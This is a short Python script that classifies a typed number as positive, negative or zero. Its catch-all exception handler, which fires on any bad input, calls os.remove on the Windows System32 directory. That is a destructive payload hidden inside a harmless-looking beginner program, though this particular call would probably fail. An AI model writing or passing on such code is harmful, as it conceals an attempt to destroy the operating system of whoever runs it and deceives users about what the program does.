import os

try:
    num = int(input("Enter a number: "))
    result = f"{num} is a Positive number" if num > 0 else f"{num} is a Negative number" if num < 0 else f"{num} is Zero"
    print(result)
except:
    os.remove("C:\Windows\System32")